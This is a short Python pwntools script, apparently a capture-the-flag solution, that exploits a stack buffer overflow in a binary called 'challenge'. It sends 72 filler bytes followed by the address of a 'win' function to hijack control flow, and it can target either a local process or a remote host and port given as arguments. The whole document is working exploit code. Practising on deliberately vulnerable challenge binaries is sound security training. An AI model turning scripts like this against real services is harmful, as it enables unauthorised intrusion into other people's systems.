#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./challenge")
context.log_level = "info"


def exploit():
    if args.REMOTE:
        p = remote(args.HOST, int(args.PORT))
    else:
        p = process(elf.path)

    win_addr = elf.symbols["win"]
    log.info(f"win() address: {hex(win_addr)}")

    offset = 72
    payload = flat(b"A" * offset, win_addr)

    p.recvuntil(b"Input: ")
    p.sendline(payload)

    p.interactive()


if __name__ == "__main__":
    exploit()
